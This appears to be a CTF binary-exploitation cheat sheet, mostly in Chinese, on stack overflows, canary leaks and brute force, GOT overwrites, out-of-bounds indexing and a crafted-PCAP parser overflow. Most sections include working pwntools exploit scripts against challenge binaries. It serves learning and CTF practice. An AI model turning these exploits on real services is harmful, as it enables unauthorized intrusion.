# CTF Pwn - Overflow Basics

## Table of Contents
- [Stack Buffer Overflow](#stack-buffer-overflow)
  - [ret2win with Parameter (Magic Value Check)](#ret2win-with-parameter-magic-value-check)
  - [Stack Alignment (16-byte Requirement)](#stack-alignment-16-byte-requirement)
  - [Offset Calculation from Disassembly](#offset-calculation-from-disassembly)
  - [Input Filtering (memmem checks)](#input-filtering-memmem-checks)
  - [Finding Gadgets](#finding-gadgets)
  - [Hidden Gadgets in CMP Immediates](#hidden-gadgets-in-cmp-immediates)
- [Struct Pointer Overwrite (Heap Menu Challenges)](#struct-pointer-overwrite-heap-menu-challenges)
- [Signed Integer Bypass (Negative Quantity)](#signed-integer-bypass-negative-quantity)
- [Canary-Aware Partial Overflow](#canary-aware-partial-overflow)
- [OOB Read via Stride/Rate Leak (DiceCTF 2026)](#oob-read-via-striderate-leak-dicectf-2026)
- [Stack Canary Byte-by-Byte Brute Force on Forking Servers](#stack-canary-byte-by-byte-brute-force-on-forking-servers)
- [Global Buffer Overflow (CSV Injection)](#global-buffer-overflow-csv-injection)
- [Protocol Length Field Stack Bleeding (EKOPARTY CTF 2016)](#protocol-length-field-stack-bleeding-ekoparty-ctf-2016)
- [Parser Stack Overflow via Unchecked memcpy Length (MetaCTF Flash 2026)](#parser-stack-overflow-via-unchecked-memcpy-length-metactf-flash-2026)
- [Stack Canary Null-Byte Overwrite Leak (CSAW 2017)](#stack-canary-null-byte-overwrite-leak-csaw-2017)
- [Empty-Token strncmp(n=0) MAC Bypass (UCSB iCTF 2018)](#empty-token-strncmpn0-mac-bypass-ucsb-ictf-2018)
- [Return Address LSB Overwrite + read() Chaining (TUCTF 2018)](#return-address-lsb-overwrite--read-chaining-tuctf-2018)
- [Canary Trailing-Byte Leak via Padding One Byte Past Null (hxp 2018)](#canary-trailing-byte-leak-via-padding-one-byte-past-null-hxp-2018)
- [Index-Only Bounds Check + Stride OOB Write (P.W.N. CTF 2018)](#index-only-bounds-check--stride-oob-write-pwn-ctf-2018)
- [Signed Index Negative OOB to Preceding GOT (P.W.N. CTF 2018)](#signed-index-negative-oob-to-preceding-got-pwn-ctf-2018)
- [PIE Same-Page Function Pivot via Single-Byte Overwrite (P.W.N. CTF 2018)](#pie-same-page-function-pivot-via-single-byte-overwrite-pwn-ctf-2018)
- [scanf Format-Error Skip for Canary Preservation (nullcon HackIM 2019)](#scanf-format-error-skip-for-canary-preservation-nullcon-hackim-2019)

---

## Stack Buffer Overflow

1. 找到返回地址偏移：`cyclic 200` 然后 `cyclic -l <value>`
2. 检查保护：`checksec --file=binary`
3. No PIE + No canary = 直接 ROP
4. 通过格式串或部分覆写泄漏 canary

### ret2win with Parameter (Magic Value Check)

**模式：** Win 函数会先检查参数是否等于 magic value，再打印 flag。

```c
// 反汇编中常见的模式
void win(long arg) {
    if (arg == 0x1337c0decafebeef) {  // Magic check
        // Open and print flag
    }
}
```

**利用（x86-64）：**
```python
from pwn import *

# Find gadgets
pop_rdi_ret = 0x40150b   # pop rdi; ret
ret = 0x40101a           # ret (for stack alignment)
win_func = 0x4013ac
magic = 0x1337c0decafebeef

offset = 112 + 8  # = 120 bytes to reach return address

payload = b"A" * offset
payload += p64(ret)        # Stack alignment (Ubuntu/glibc requires 16-byte)
payload += p64(pop_rdi_ret)
payload += p64(magic)
payload += p64(win_func)
```

**定位 win 函数：**
- 在 Ghidra 中搜索 `fopen("flag.txt")` 或类似调用
- 找没有 XREF、但会检查 magic 参数的函数
- 查参数比较后接条件打印/退出的模式

### Stack Alignment (16-byte Requirement)

现代 Ubuntu/glibc 要求在执行 `call` 前栈 16 字节对齐。未对齐时常见症状：
- 在 `movaps` 指令处 SIGSEGV（SSE 要求对齐）
- 在 libc 函数内部崩溃（printf、system 等）

**修复：** 在 ROP 链前额外插入一个 `ret` gadget：
```python
payload = b"A" * offset
payload += p64(ret)        # Align stack to 16 bytes
payload += p64(pop_rdi_ret)
# ... rest of chain
```

### Offset Calculation from Disassembly

```asm
push   %rbp
mov    %rsp,%rbp
sub    $0x70,%rsp        ; Stack frame = 0x70 (112) bytes
...
lea    -0x70(%rbp),%rax  ; Buffer at rbp-0x70
mov    $0xf0,%edx        ; read() size = 240 (overflow!)
```

**计算偏移：**
- Buffer 起始于 `rbp - buffer_offset`（例如 `rbp-0x70`）
- 保存的 RBP 位于 `rbp`
- 返回地址位于 `rbp + 8`
- **总偏移 = buffer_offset + 8** = 112 + 8 = 120 字节

### Input Filtering (memmem checks)

有些题会用 `memmem()` 过滤输入中的特定字符串：
```python
payload = b"A" * 120 + p64(gadget) + p64(value)
assert b"badge" not in payload and b"token" not in payload
```

### Finding Gadgets

```bash
# Find pop rdi; ret
objdump -d binary | grep -B1 "pop.*rdi"
ROPgadget --binary binary | grep "pop rdi"

# Find simple ret (for alignment)
objdump -d binary | grep -E "^\s+[0-9a-f]+:\s+c3\s+ret"
```

### Hidden Gadgets in CMP Immediates

带大 immediate 的 CMP 指令中常编码出有用字节序列。pwntools 的 `ROP()` 会自动找到这些：

```asm
# Example: cmpl $0xc35e415f, -0x4(%rbp)
# Bytes: 81 7d fc 5f 41 5e c3
#                  ^^ ^^ ^^ ^^
# At +3: 5f 41 5e c3 = pop rdi; pop r14; ret
# At +4: 41 5e c3    = pop r14; ret
# At +5: 5e c3       = pop rsi; ret
```

**何时检查：** 小体积二进制常缺标准 gadget。重点看含大 immediate 的 `cmp`、`mov`、`test` 指令，它们的操作数字节可能恰好反汇编成可用 gadget。

```python
rop = ROP(elf)
# pwntools finds these automatically
for addr, gadget in rop.gadgets.items():
    print(hex(addr), gadget)
```

## Struct Pointer Overwrite (Heap Menu Challenges)

**模式：** 菜单式程序提供 create/modify/delete/view 等操作，结构体同时包含数据缓冲区和指针字段。modify/edit 会读入超过缓冲区大小的数据，从而溢出到相邻指针字段。

**结构体布局示例：**
```c
struct Student {
    char name[36];      // offset 0x00 - data buffer
    int *grade_ptr;     // offset 0x24 - pointer to separate allocation
    float gpa;          // offset 0x28
};  // total: 0x2c (44 bytes)
```

**利用：**
```python
from pwn import *

WIN = 0x08049316
GOT_TARGET = 0x0804c00c  # printf@GOT

# 1. Create object (allocates struct + sub-allocations)
create_student("AAAA", 5, 3.5)

# 2. Modify name - overflow into pointer field with GOT address
payload = b'A' * 36 + p32(GOT_TARGET)  # 36 bytes padding + GOT addr
modify_name(0, payload)

# 3. Modify grade - scanf("%d", corrupted_ptr) writes to GOT
modify_grade(0, str(WIN))  # Writes win addr as int to GOT entry

# 4. Trigger overwritten function -> jumps to win
```

**GOT 目标选择策略：**
- 识别 win 函数内部会调用哪些 libc 函数
- 不要覆写 win 本身还要用到的 GOT 项，否则会递归/崩溃
- 优先选择写入之后、主循环后续一定会调用的函数

| Win uses | Safe GOT targets |
|----------|-------------------|
| puts, fopen, fread, fclose, exit | printf, free, getchar, malloc, scanf |
| printf, system | puts, exit, free |
| system only | puts, printf, exit |

## Signed Integer Bypass (Negative Quantity)

`scanf("%d")` 没做符号检查；负输入可绕过原本按无符号逻辑设计的比较。完整细节见 [advanced-exploits.md](advanced-exploits.md#signed-integer-bypass-negative-quantity)。

## Canary-Aware Partial Overflow

在不碰 canary 的前提下，溢出覆盖位于 buffer 与 canary 之间的 `valid` 标志。可用 `./` 作为无副作用路径填充以精准控长。完整利用链见 [advanced-exploits.md](advanced-exploits.md#canary-aware-partial-overflow)。

## OOB Read via Stride/Rate Leak (DiceCTF 2026)

**模式（ByteCrusher）：** 字符串处理函数按可配置步长 `rate` 遍历输入缓冲区。当 `rate` 超过缓冲区长度时，会跳过结尾的空字节并继续读取相邻栈数据（canary、返回地址）。

**栈布局：**
```text
input_buf  [0-31]    <- user input (null at byte 31)
crushed    [32-63]   <- output buffer
canary     [72-79]   <- stack canary
saved rbp  [80-87]
return addr [88-95]  <- code pointer (defeats PIE)
```

**漏洞模式：**
```c
void crush_string(char *input, char *output, int rate, int output_max_len) {
    for (int i = 0; input[i] != '\0' && out_idx < output_max_len - 1; i += rate) {
        output[out_idx++] = input[i];  // rate > bufsize skips past null terminator
    }
}
```

**利用：**
```python
from pwn import *

# Leak canary bytes 1-7 (byte 0 always 0x00)
canary = b'\x00'
for offset in range(73, 80):  # canary at offsets 72-79
    p.sendline(b'A' * 31)     # fill buffer (null at byte 31)
    p.sendline(str(offset).encode())  # rate = offset → reads input[0] then input[offset]
    p.sendline(b'2')           # output length = 2
    resp = p.recvline()
    canary += resp[1:2]        # second char is leaked byte

# Leak return address bytes 0-5 (top 2 always 0x00 in userspace)
ret_addr = b''
for offset in range(88, 94):
    p.sendline(b'A' * 31)
    p.sendline(str(offset).encode())
    p.sendline(b'2')
    resp = p.recvline()
    ret_addr += resp[1:2]

pie_base = u64(ret_addr.ljust(8, b'\x00')) - known_offset
admin_portal = pie_base + admin_offset

# Overflow gets() with leaked canary + computed address
payload = b'A' * 24 + canary + p64(0) + p64(admin_portal)
p.sendline(payload)
```

**适用场景：** 凡是存在“用户可控步长 + 以空字节作为停止条件”的缓冲区遍历函数，都值得考虑。

**核心点：** 通过控制步长让访问恰好落到目标字节上，每轮泄漏 1 字节。足够多轮之后即可泄漏完整 canary 和返回地址，同时绕过栈 canary 与 PIE。

## Stack Canary Byte-by-Byte Brute Force on Forking Servers

**模式：** 服务器对每个连接都 `fork()` 一个子进程。子进程继承同一个 canary。于是可以逐字节爆破 canary；猜错会崩当前子进程，但父进程继续提供相同 canary 的新子进程。

**Canary 结构：** 第 1 字节总是 `\x00`（防止字符串函数泄漏）。其余 7 字节随机。x86-64 上总长 8 字节，x86-32 上为 4 字节。

**利用：**
```python
from pwn import *

OFFSET = 64  # bytes to canary (buffer size)
HOST, PORT = "target", 1337

def try_byte(known_canary, guess_byte):
    """Send overflow with known canary bytes + one guess. No crash = correct byte."""
    p = remote(HOST, PORT)
    payload = b'A' * OFFSET + known_canary + bytes([guess_byte])
    p.send(payload)
    try:
        resp = p.recv(timeout=1)
        p.close()
        return True   # No crash → byte is correct
    except:
        p.close()
        return False  # Crash → wrong byte

# Byte 0 is always \x00
canary = b'\x00'

# Brute-force bytes 1-7 (only 256 attempts per byte, 7*256 = 1792 total)
for byte_pos in range(1, 8):
    for guess in range(256):
        if try_byte(canary, guess):
            canary += bytes([guess])
            print(f"Canary byte {byte_pos}: 0x{guess:02x}")
            break
    else:
        print(f"Failed at byte {byte_pos}")
        break

print(f"Full canary: {canary.hex()}")

# Now overflow with correct canary + ROP chain
p = remote(HOST, PORT)
payload = b'A' * OFFSET + canary + b'B' * 8 + p64(win_addr)
p.sendline(payload)
```

**前提条件：**
- 服务端必须是每连接 `fork()` 一次（子进程间 canary 不变）
- 溢出必须支持逐字节试探（不能只有一次性整块读）
- 能区分崩溃与成功（超时、报错、连接行为差异）

**尝试次数预期：** 平均 `7 * 128 = 896`，上限 `7 * 256 = 1792`。

**核心点：** `fork()` 会保留 canary。逐字节爆破 7 个未知字节，比一次性爆完整 8 字节高效得多。

---

## Global Buffer Overflow (CSV Injection)

**模式（Spreadsheet）：** 通过额外 CSV 分隔符溢出相邻全局变量，从而修改文件名指针。完整模式见 [advanced.md](advanced.md)。

---

## Protocol Length Field Stack Bleeding (EKOPARTY CTF 2016)

若自定义网络协议根据请求头中的长度字段回显数据，而该长度可以大于实际提供的数据，就可能像 Heartbleed 一样泄漏栈内存。

```python
from pwn import *

# Custom protocol: [4-byte magic][1-byte length][payload]
# Server echoes back `length` bytes of the response buffer
# If length > actual payload, server leaks stack/heap memory

io = remote('target.ctf', 1337)

# Normal request: 5 bytes of data, length = 5
# Bleeding request: 5 bytes of data, length = 255
magic = b'\x00\x01\x02\x03'
length_field = b'\xff'  # request 255 bytes back
payload = b'AAAAA'      # only send 5 bytes

io.send(magic + length_field + payload)
leaked = io.recv(255)

# Search leaked memory for flag pattern
if b'flag{' in leaked or b'CTF{' in leaked:
    log.success(f"Flag found in leaked data!")

# Alternatively, search for addresses (libc pointers, stack addresses)
for i in range(0, len(leaked) - 8, 8):
    addr = u64(leaked[i:i+8])
    if 0x7f0000000000 < addr < 0x7fffffffffff:
        log.info(f"Possible libc/stack address at offset {i}: {hex(addr)}")
```

**核心点：** 任何“由客户端提供长度，服务端据此决定返回多少字节”的协议，都可能发生 overread。服务端会越过真实缓冲区，继续读取相邻栈/堆内存，泄漏 flag、地址和 canary。

---

## Parser Stack Overflow via Unchecked memcpy Length (MetaCTF Flash 2026)

**模式（PCAP Trap）：** 自定义文件解析器（如 PCAP、图片、归档）在栈上分配固定大小缓冲区，但允许输入记录声明比缓冲区更长的长度。在做长度检查前，`memcpy` 已把整条记录复制进栈缓冲区，覆盖保存寄存器和返回地址。

```python
from pwn import *

# Example: PCAP parser with 0x10000 byte stack buffer
# but PCAP packets can specify up to 0x20000 bytes (snaplen)
# memcpy(stack_buf, packet_data, packet_len) has no bounds check

elf = ELF('./pcap_parser')
context.binary = elf

# Step 1: Determine overflow offset
# Buffer is 0x10000 bytes on stack
# After buffer: saved callee-save registers (rbx, r12, ...) then return address
BUF_SIZE = 0x10000
# Offset to saved registers depends on function prologue
# Check disassembly: push rbx; push r12; sub rsp, 0x10000
OFFSET_RBX = BUF_SIZE       # first saved register
OFFSET_R12 = BUF_SIZE + 8   # second saved register
OFFSET_RET = BUF_SIZE + 16  # return address

# Step 2: Craft payload with register restoration
# Callee-saved registers must be valid or the function epilogue crashes
# rbx: point to readable memory (e.g., BSS) to avoid SIGSEGV on dereference
# r12: set to value that exits cleanly (e.g., loop terminator = 1)

bss_addr = elf.bss()         # Readable memory for rbx
win_addr = elf.symbols['win'] # Target function

payload = b'A' * BUF_SIZE
payload += p64(bss_addr)      # rbx -> valid readable address
payload += p64(1)             # r12 = 1 (loop exit condition)
payload += p64(elf.symbols['ret_gadget'])  # ret alignment gadget
payload += p64(win_addr)      # return to win()

# Step 3: Wrap in valid file format container
# For PCAP: valid global header + packet header with large caplen
import struct

# PCAP global header
pcap_header = struct.pack('<IHHIIII',
    0xa1b2c3d4,  # magic number
    2, 4,        # version 2.4
    0,           # thiszone
    0,           # sigfigs
    0x20000,     # snaplen (max packet size - larger than stack buffer!)
    1            # network (LINKTYPE_ETHERNET)
)

# PCAP packet record header
pkt_ts_sec = 0
pkt_ts_usec = 0
pkt_caplen = len(payload)   # captured length = our overflow payload
pkt_origlen = len(payload)

pkt_header = struct.pack('<IIII', pkt_ts_sec, pkt_ts_usec, pkt_caplen, pkt_origlen)

# Build malicious PCAP
pcap_data = pcap_header + pkt_header + payload

with open('exploit.pcap', 'wb') as f:
    f.write(pcap_data)

# Step 4: Send to target
p = remote('target', 1337)
p.send(pcap_data)
p.interactive()
```

**核心点：** 自定义文件解析器经常按“预期最大长度”在栈上分配固定缓冲区，但文件格式本身允许更大记录。若 `memcpy` 发生在检查前，就会形成经典栈溢出。利用时必须把被调用者保存寄存器恢复为合法值，否则函数尾声会在回到返回地址前先因寄存器非法而崩溃。常见要求：`rbx` 指向可读内存（BSS），循环计数寄存器满足退出条件。

**恢复被调用者保存寄存器检查表：**
1. 从函数序言中识别被 `push` 保存的寄存器（`push rbx`、`push r12` 等）
2. 确认它们在函数尾声中的恢复顺序（与 push 逆序）
3. `rbx` 设为任意可读地址（BSS、GOT 或已知映射页）
4. 循环计数器（`r12`、`r13`）设为能让循环正常退出的值
5. 在 win 地址前加入一个 `ret` gadget 做 16 字节栈对齐

**识别特征：** 题目涉及自定义二进制文件格式解析器（PCAP、ELF、图片、协议缓冲）。解析器对输入长度字段调用 `memcpy` 或 `read`。检查缓冲区大小是否小于格式允许的最大记录长度。

**References:** MetaCTF Flash CTF 2026 "PCAP Trap"

---

## Stack Canary Null-Byte Overwrite Leak (CSAW 2017)

**模式：** 栈 canary 低字节固定为 `\x00`，用来防止字符串泄漏。如果溢出能只改掉这个空字节，把它变成非空字符，那么 `puts()` 或 `printf("%s")` 会继续输出后续 7 个 canary 字节。再配合一次 return-to-main，就能在第二阶段使用完整 canary。

**栈布局：**
```text
[buffer] [canary \x00 XX XX XX XX XX XX XX] [saved rbp] [return addr]
                  ^--- overwrite only this byte with 'A'
                  → puts() now prints: 'A' + 7 canary bytes + (more stack data)
```

**利用：**
```python
from pwn import *

# Stage 1: Overwrite canary's null byte, leak remaining 7 bytes via puts
p.send(b'A' * buf_size + b'B')   # 'B' overwrites the canary's null byte
leak = p.recvline()
# leak[buf_size] = 'B', leak[buf_size+1:buf_size+8] = 7 canary bytes
canary = b'\x00' + leak[buf_size + 1: buf_size + 8]
canary_val = u64(canary)
log.info(f"Leaked canary: {hex(canary_val)}")

# Stage 2: Return-to-main for clean second exploitation
# First stage payload returned to main() — now build full ROP chain
p.send(b'A' * buf_size + canary + p64(0) + p64(win_addr))
```

**为什么要 return-to-main：** 第一阶段为泄漏 canary 必须故意破坏其空字节，因此函数返回时必然触发 canary 检查崩溃。先回到 main 可重置栈帧，再用已知 canary 进行第二阶段输入。

**核心点：** canary 的空字节终止特性既是保护，也是泄漏入口。只改动这一字节即可让字符串函数继续打印 canary。

**References:** CSAW 2017

---

## Empty-Token strncmp(n=0) MAC Bypass (UCSB iCTF 2018)

**模式：** MAC 或鉴权逻辑从用户输入中取出比较长度 `n`，然后调用 `strncmp(expected, supplied, n)`。当 `n == 0` 时，`strncmp` 无条件返回 0，任何 token 都会被接受。

**漏洞代码：**
```c
int n = atoi(user_len);            // attacker controls length
if (strncmp(expected_mac, user_mac, n) == 0) {
    grant_access();
}
```

**利用：** 发送 `len=0`（或能解析成 0 的长度字段）以及任意 MAC。

**核心点：** 任意“变长比较器”如 `strncmp`、`memcmp`、`bcmp`，在长度为 0 时都返回相等。应单独校验长度，拒绝 `n <= 0`，或改用 `CRYPTO_memcmp`/`hmac_equal` 比较固定长度缓冲区。类似问题也会出现在客户端可控 HMAC 长度或 TLV 头里。

**References:** UCSB iCTF 2018 — writeup 10009

---

## Return Address LSB Overwrite + read() Chaining (TUCTF 2018)

**模式：** `read(0, buf, 0x80)` 恰好只多写 1 字节到保存的返回地址（典型 off-by-one）。只改 RIP 低字节，高字节保持不变，因此能跳回同一函数中稍早的位置。选一个落在另一次 `read()` 调用之前的偏移，就能再次触发读入，且参数仍由攻击者控制。

```python
# Offset 29 in the buffer = saved RIP LSB
payload = b'\x15' * 29     # 0x56555d22 -> 0x56555d15 (inside read() prologue)
p.sendline(payload)

# Second read call now reads into &password with length 0x2b
p.send(p32(0) + p32(password_addr) + p32(0x2b))
```

**核心点：** 1 字节 ret 覆写若能重用现有函数逻辑，往往比完整 ROP 更强，因为它可以完全绕过 ASLR，无需知道基址。

**References:** TUCTF 2018 — Lisa, writeup 12339

---

## Canary Trailing-Byte Leak via Padding One Byte Past Null (hxp 2018)

**模式：** glibc 栈 canary 的起始字节总是 `0x00`，以让 `strcpy`/`printf("%s")` 立即停止。若发送恰好 `buf_size + 1` 字节，`puts()` 回显时会越过 canary 的前导空字节并打印剩余 3 个字节，从而得到 3/4 的 canary。

```python
p.send(b'A' * (buf_size + 1))
leaked = p.recvline().rstrip(b'\n')
canary = b'\x00' + leaked[buf_size:]     # reconstruct full 4-byte canary
```

**核心点：** 本来用于阻止字符串泄漏的空字节，恰好也创造了泄漏入口；只要把它替换成非空字节，回显就会一路泄漏到下一个空字节。

**References:** hxp CTF 2018 — poor_canary, writeup 12568

---

## Index-Only Bounds Check + Stride OOB Write (P.W.N. CTF 2018)

**模式：** 漏洞函数读取索引 `v2`，只检查 `v2 <= 0xfc`，然后在 `array[12 * v2]` 处写入 `0xC` 字节。检查约束的是索引，而不是实际字节偏移。选择合适的 `v2` 即可让 `12 * v2` 落到数组外的返回地址、canary 或 GOT。

```c
if (v2 <= 0xFC) read(0, &array[12*v2], 0xC);   // bug: stride unchecked
```

设置 `v2 = 0xFB`，写入位置就是 `12 * 0xFB = 0xBC4`，远超数组末尾。

**核心点：** 任何“受限索引”在比较前都必须乘上元素步长。遇到 `array[N*idx]` 或结构体步长寻址时，如果只检查了 `idx` 而未检查最终偏移，就会出现这类漏洞。

**References:** P.W.N. CTF 2018 — Exploitation Class / Kindergarten PWN, writeup 12041

---

## Signed Index Negative OOB to Preceding GOT (P.W.N. CTF 2018)

**模式：** `if (v5 <= 31) array[v5] = value;` 在编译后使用的是有符号比较。传入 `-1`、`-2` 等负数依然满足检查，并会向前写到前面的内存，典型目标是 GOT 或邻接全局结构。

```c
int v5 = atoi(input);     // signed
if (v5 <= 31) table[v5] = new_value;   // writes to table[-N]
```

先用负索引泄漏 libc（如 `read` GOT），再把某个 free 类 GOT 项改成 `system`。

**核心点：** 有符号/无符号不匹配非常常见。看到带上界的索引检查时，一定先确认变量类型；若是 signed，那么 `<= N` 实际允许的区间是 `[INT_MIN..N]`。

**References:** P.W.N. CTF 2018 — Kindergarten PWN, writeup 12041

---

## PIE Same-Page Function Pivot via Single-Byte Overwrite (P.W.N. CTF 2018)

**模式：** 二进制启用 PIE，但两个函数位于同一个 4 KiB 页内：`fread_callback` 在 `base + 0x11BC`，`shell()` 在 `base + 0x11A9`。页内偏移由链接器固定，因此只需改写栈上函数指针的低字节，把 `0xBC` 改成 `0xA9`，无需任何泄漏。

```python
p.send(b'A' * overflow_to_fp + b'\xa9')
```

**核心点：** PIE 只随机化页对齐以上的高位。同页内的两个地址只在低 12 位不同，因此只要能做到单字节覆写，就能无视 ASLR。

**References:** P.W.N. CTF 2018 — Important Service, writeup 12041

---

## scanf Format-Error Skip for Canary Preservation (nullcon HackIM 2019)

**模式（babypwn）：** `coin_count` 比较时按有符号处理（`(char)count > 20` 只拒绝正向溢出），循环时却按无符号处理（`for (uint8_t i = 0; i < count; ++i)`）。发送 `128` 可以通过检查，却会循环 128 次，越过 20 槽 int 数组、栈 canary、保存的 RBP 与 RIP。常规“用同一漏洞泄漏 canary”在这里失效，因为危险的 `printf` 发生在溢出循环之后。解决办法是在两个落到 canary 的迭代里给 `scanf` 提供一个“格式上合法但无法转换”的 token，让 `scanf` 返回错误，既不消耗输入，也不写入目的地址，从而保住 canary，而后续迭代仍继续向后写。

```python
from pwn import *

target.sendline('y')
target.sendline('2019')           # name
target.sendline('128')            # unsigned char > 20 passes signed check

# Leak libc via GOT addresses in the first 8 coin slots (%8$s in the format string)
target.sendline(str(0x600FA8))    # free@GOT lower 32 bits
target.sendline(str(0))           # free@GOT upper 32 bits
# ... repeat for puts / setbuf / printf ...

for i in range(14):               # pad to reach canary slot (22 writes in)
    target.sendline('1')
    target.sendline('2')

target.sendline('-')              # "-" matches "%d" prefix but can't be a number
target.sendline('-')              # scanf returns error, leaves canary untouched
target.sendline('0')              # saved libc_csu_init slot - scratch
target.sendline('0')
target.sendline(str(0x400806))    # return address -> main() for stage 2
target.sendline(str(0))
```

**核心点：** `scanf("%d", ...)` 遇到单独的 `-` 时，会认为格式不匹配，提前返回，不写目的地址，而且不会消耗这个 `-`；下一次 `scanf` 还会以同样方式失败。这个“跳过写入”原语可以让你在固定次数写循环中精确跳过 canary/RBP 槽位，仅覆写返回地址。再结合 signed/unsigned char 比较漏洞，就能把循环次数扩大到声明上限之外。

**References:** nullcon HackIM 2019 — babypwn, writeup 13211
